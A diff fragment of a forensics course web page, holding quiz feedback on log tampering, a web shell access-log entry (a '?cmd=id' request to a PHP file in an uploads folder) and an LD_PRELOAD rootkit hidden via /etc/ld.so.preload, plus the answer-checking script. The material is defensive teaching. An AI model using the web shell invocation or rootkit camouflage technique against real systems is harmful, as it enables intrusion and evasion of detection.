+      text: 'This reverses the forensic logic. The binary journal is <em>more</em> reliable than plain-text logs in a tampering scenario because it is harder to silently modify — it uses a binary format with optional forward-secure sealing, and its entries cannot be easily deleted with a text editor. When plain-text and binary logs disagree, the binary journal is generally the more trustworthy source. The discrepancy itself is the evidence — it tells you the plain-text log was tampered with.'
+    },
+    d: {
+      correct: false,
+      verdict: '❌ Incorrect.',
+      text: 'rsyslog does buffer writes briefly for performance, but the lag is typically milliseconds to a few seconds — not four minutes. A four-minute gap between the last log entry and the file\'s mtime on an active server is far outside normal buffering behavior. Additionally, this explanation cannot account for the 76-minute gap between the last auth.log entry (21:31) and the last journal entry (22:47) — the journal shows the system was actively generating events during that window.'
+    }
+  },
+  2: {
+    b: {
+      correct: true,
+      verdict: '✅ Correct!',
+      text: 'This is a textbook web shell execution entry, and every field contributes to the finding. The URI (<code>/uploads/avatar_20260301.php</code>) shows a PHP file in an uploads directory — uploads directories should contain images or documents, not executable PHP scripts. The <code>?cmd=id</code> parameter is the web shell\'s command execution interface. The HTTP <strong>200 response</strong> is the critical indicator: the server <em>successfully executed the request</em>. The <strong>43-byte response body</strong> is consistent with the output of the <code>id</code> command (e.g., <code>uid=33(www-data) gid=33(www-data) groups=33(www-data)</code> is approximately 43 characters). Together, these indicators prove the web shell was functional and the attacker received command output.'
+    },
+    a: {
+      correct: false,
+      verdict: '❌ Incorrect.',
+      text: 'The User-Agent "Mozilla/5.0" does not prove a human was using a browser — it is trivially easy to set any User-Agent string in a script or tool. Automated attack tools frequently use browser-like User-Agent strings to evade detection. The User-Agent is the <em>least significant</em> indicator in this entry. The combination of PHP file in an uploads directory + command parameter + HTTP 200 + small response body is far more significant.'
+    },
+    c: {
+      correct: false,
+      verdict: '❌ Incorrect.',
+      text: 'The timing is indeed relevant for building the attack timeline, but describing the request itself as "unremarkable" is a serious analytical error. A PHP file with a <code>?cmd=</code> parameter returning HTTP 200 in an uploads directory is one of the clearest web shell execution signatures in forensic practice. The timing adds context but does not change the nature of this finding — it is a critical indicator of successful exploitation regardless of when it occurred.'
+    },
+    d: {
+      correct: false,
+      verdict: '❌ Incorrect.',
+      text: 'The IP address 198.51.100.77 is from the TEST-NET-3 range (198.51.100.0/24), which is reserved for documentation and examples — similar to how this course uses it. In a real investigation, you would see actual routable IP addresses. The log entry should not be disregarded; the forensic analysis of its fields (PHP file in uploads directory, cmd parameter, HTTP 200, byte count) is valid regardless of the source IP. The analytical skills you apply here transfer directly to real log entries.'
+    }
+  },
+  3: {
+    b: {
+      correct: true,
+      verdict: '✅ Correct!',
+      text: 'This is exactly the right response. <code>/etc/ld.so.preload</code> should be empty or non-existent on a normally configured Ubuntu server — its presence with any library path is a critical red flag. The library name <code>libaudit.so.1</code> is designed to look legitimate (it mimics the real Linux audit library name), but the real <code>libaudit</code> is loaded through normal shared library mechanisms, not via <code>ld.so.preload</code>. Most importantly: if this is an LD_PRELOAD rootkit, <strong>the output of every user-space tool — including <code>ls</code>, <code>ps</code>, <code>netstat</code>, and <code>find</code> — cannot be trusted on the live system</strong>. The clean <code>/tmp/</code> is likely filtered by the rootkit. Dead-box analysis of the forensic image is the correct path forward.'
+    },
+    a: {
+      correct: false,
+      verdict: '❌ Incorrect.',
+      text: '<code>/etc/ld.so.preload</code> is <strong>not</strong> a standard configuration file on Ubuntu systems — it should not exist or should be empty on a normally configured server. The real <code>libaudit.so.1</code> is loaded through normal dynamic linking (listed in <code>/etc/ld.so.conf.d/</code>), not through <code>ld.so.preload</code>. Using a legitimate-sounding library name is a classic rootkit camouflage technique. The clean <code>/tmp/</code> output cannot be trusted if an LD_PRELOAD rootkit is active.'
+    },
+    c: {
+      correct: false,
+      verdict: '❌ Incorrect.',
+      text: 'This is dangerous advice. If <code>/etc/ld.so.preload</code> contains a malicious library, continuing live analysis with standard tools means you are examining a filtered, attacker-controlled view of the system. Every file listing, process listing, and network connection report may be hiding attacker artifacts. The clean <code>/tmp/</code> is exactly what a rootkit would show you — it has filtered out its own files. Dead-box analysis from the forensic image is required to get an unfiltered view.'
+    },
+    d: {
+      correct: false,
+      verdict: '❌ Incorrect — this would be a serious forensic error.',
+      text: 'Deleting <code>/etc/ld.so.preload</code> on the live system would: (1) modify the evidence, breaking chain of custody and potentially invalidating the image hash; (2) potentially alert the attacker if the rootkit phones home; and (3) not necessarily remove the malicious library from memory — it may already be loaded into running processes. The correct action is to <em>document</em> the finding on the live system (if conducting live triage), then rely on the forensic image for all substantive analysis. Never modify evidence on a system under investigation.'
+    }
+  }
+};
+
+function checkAnswer(qNum, correctVal, btn) {
+  var selected = document.querySelector('input[name="q' + qNum + '"]:checked');
+  var feedbackEl = document.getElementById('q' + qNum + '-feedback');
+
+  if (!selected) {
+    feedbackEl.className = 'kc-feedback kc-feedback--incorrect show';
+    feedbackEl.innerHTML = '<p class="kc-feedback__verdict">⚠️ Please select an answer first.</p>';
+    return;
+  }
+
+  var val = selected.value;
+  var data = kcFeedback[qNum][val];
+  var isCorrect = (val === correctVal);
+
+  feedbackEl.className = 'kc-feedback ' + (isCorrect ? 'kc-feedback--correct' : 'kc-feedback--incorrect') + ' show';
+  feedbackEl.innerHTML = '<p class="kc-feedback__verdict">' + data.verdict + '</p><p>' + data.text + '</p>';
+
+  document.querySelectorAll('input[name="q' + qNum + '"]').forEach(function (r) { r.disabled = true; });
+
+  btn.textContent = isCorrect ? '✅ Answered' : '🔄 Answered';
+  btn.disabled = true;
+  btn.style.background = isCorrect ? 'var(--clr-success)' : '#8b1a1a';
+
+  feedbackEl.setAttribute('tabindex', '-1');
+  feedbackEl.focus();
+}
+</script>
+</body>
+</html>
